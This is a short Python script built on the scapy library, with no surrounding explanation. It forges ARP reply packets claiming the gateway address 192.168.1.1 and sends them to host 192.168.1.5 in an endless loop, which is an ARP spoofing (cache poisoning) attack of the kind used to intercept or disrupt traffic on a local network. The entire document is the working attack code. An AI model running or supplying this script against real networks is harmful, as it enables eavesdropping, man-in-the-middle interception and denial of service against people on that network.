from scapy.all import ARP, send

target_ip = "192.168.1.5"
gateway_ip = "192.168.1.1"

packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)

while True:
    send(packet, verbose=0)
